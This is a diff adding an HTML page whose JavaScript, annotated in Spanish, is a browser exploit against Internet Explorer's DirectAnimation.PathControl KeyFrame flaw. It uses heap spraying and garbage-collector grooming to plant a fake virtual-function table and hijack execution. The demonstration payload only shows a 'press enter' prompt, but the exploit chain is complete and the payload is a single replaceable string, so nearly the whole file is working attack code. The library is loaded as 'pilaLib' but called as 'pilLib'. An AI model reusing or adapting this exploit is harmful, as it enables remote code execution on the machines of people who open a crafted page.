@@ -1,0 +1,70 @@
+<html>
+<script src="pilaLib.js"></script>
+<script>
+//elegimos bloques de mas de 0x2000 para forzar que se guarden en el System allocator y no en CMemManager, elegimos 0x200c
+//por eso usamos 0x40000801 puntos graficos
+//la funcion del IE DirectAnimation.PathControl KeyFrame(0x40000801,new Array(1)...) genera 4 buffers, con cabeceras de 8 Bytes
+//de tamanios: 0x8018, 0x4008, 0x200c y 0x200c
+//como se le pasa de argumentos dos listas de 1 elemento, da error argumento invalido, E_INVALIDARG
+//por culpa de este error el sistema ejecuta una funcion de limpiado que recorre las direcciones de 0 a 0x40000801, y lo mas importante
+//recorre los datos dentro de los dos buferes de tamanio 0x200c, recorre sus 0x2004 direcciones intentando ejecutar
+//una funcion virtual si no es NULL, aprovechamos que sobrepasara el ultimo buffer y recorrera una dword extra de mas, para colocar ahi nuestra
+//direccion-puntero a la tabla
+//recorre esa dword extra porque utiliza tamanios multiplos de 8, en vez de 0x200c redondea a 0x2010 = 1dword extra(4 bytes mas)
+	var objetivo = new ActiveXObject("DirectAnimation.PathControl");
+	var pila = new pilLib.ie();
+	//me encanta la palabra codigo concha :D
+	//muestra por pantalla: "pulsa una tecla para continuar"
+	var codigoConcha = unescape("set%20/p%20temp%3D%22Hit%20enter%20to%20continue%22");//"echo%20%22hola%20mundo%22");
+	var saltoEjec = 0x4058b5;//direccion de salto de ejecucion en IE, lo sabe porque ha decompilado sus DLLs en XP SP2
+	var tablaVirt = pila.creaTabVirt(codigoConcha, saltoEjec);//tabla de funcion virtual, String con instrucciones ensamblador de ejecucion codigo concha
+	//por defecto punteroObjetoFalso = 0x151E58 = 1384024 = 1376256 + 1672 + ((1008+8)/8)*48 = 0x150000 + 0x688 + ((1008+8)/8)*48
+	var punteroObjetoFalso = pila.creaPunteroListaTablas(tablaVirt);//devuelve el puntero a la lista de tablas virtuales
+	//BLOQUE INJECTOR
+	//tiene la injeccion de codigo: desde la direccion 0x200c a la 0x2010, 4bytes
+	//la direccion del puntero ocupa esos 4 bytes
+	//ponemos relleno para llenar el bloque = 
+	// = [4(longitudImplicitaString) + 8200](rellenoIni) + [4](INJECCION) + [14 + 2(nulosImplicitosString)](rellenoFin) = 8224bytes = 0x2020
+	//rellenoIni = 8200bytes = 0x2008 = 0x200c-4
+	//rellenoFin = 14bytes
+	//guardado de STRING en memoria
+	//4(longitud)+string+2(null)=4+(8200+INJECCION+14)+2
+	var bloqueInjector = pila.rellena((0x200c-4)/2)+pila.direccion(punteroObjetoFalso)+pila.rellena(14/2);
+	//aqui se fuerza la recogida de basura para que las siguientes asignaciones machaquen todo lo que este sin enlazar
+	//asi administramos la pila de STRINGs de la RAM con control total
+	pila.recolectorBasura();
+	pila.depurar(true);
+	//listaTablas tiene 100 filas cada una con una supuesta tabla virtual, en realidad solo pondremos nuestra tabla
+	pila.depur("vacia la pila de la RAM en bloques de 1008bytes");
+	//crea una lista de 100 bloques de 1008 bytes
+	//obliga a que lo siguiente que eliminemos de la RAM si ocupa lo mismo(1008bytes) se ponga en el primer hueco, y no en un sitio al azar	
+	for(var i = 0; i<100 ;i++){
+		pila.escribeEnMemoria(tablaVirt,"e");//relleno
+	}
+	pila.depur("pone la tabla virtual en la lista tablas virtuales");	
+	pila.guardaTabla(tablaVirt);//guarda la tabla en RAM, la elimina y llama al rec basur
+	//este quita los 100 que no se han eliminado,
+	//el reco basur limpia y deja la tabla virtual eliminada en la primera posicion: en la dir(punteroObjetoFalso)
+	//la deja como instruccion y no como STRING
+	pila.depur("defragmenta la pila en bloques de 0x2010");
+	//obliga a que lo siguiente que eliminemos de la RAM si ocupa lo mismo(0x2010bytes) se ponga en el primer hueco de ese tamanio, y no en un sitio al azar
+	for(var i = 0; i<100 ;i++){
+		pila.escribeEnMemoria(0x2010,"e");//relleno
+	}
+	pila.depur("crea bloquesInjectores en RAM con punteros a la tabla virtual, de tamanio 0x2020");
+	pila.guardaBloqueInjector(bloqueInjector,2);//guarda bloqueInjector en RAM 2 veces y los elimina, llama al rec basur, 
+	//los guarda en RAM como instruccion y no como STRING
+	//este solapa los bloques de 0x2020 en los huecos de 0x2010 (algo no importante)
+	//en este punto tenemos la tabla y el bloque de injeccion en RAM, interpretados como string huerfanos, es decir, que se pueden interpretar como instrucciones
+	
+	//dispara la falla, solapa el buffer de la funcion KeyFrame de 0x200c bytes con nuestro bloqueInjector de 0x2020 bytes
+	//trata la excepcion E_INVALIDARG, ejecuta la funcion de limpiado y llama a funciones virtuales de la 0 a la 0x40000801
+	//cuando llega a su buffer solapado con nuestro bloque lee la direccion a la tabla virtual(aunque en realidad es un string huerfano) 
+	//y ejecuta nuestro codigo concha
+	objetivo.KeyFrame(0x40000801,new Array(1), new Array(1));
+	pila.depurar(false);
+</script>
+<body>
+	
+</body>
+</html>
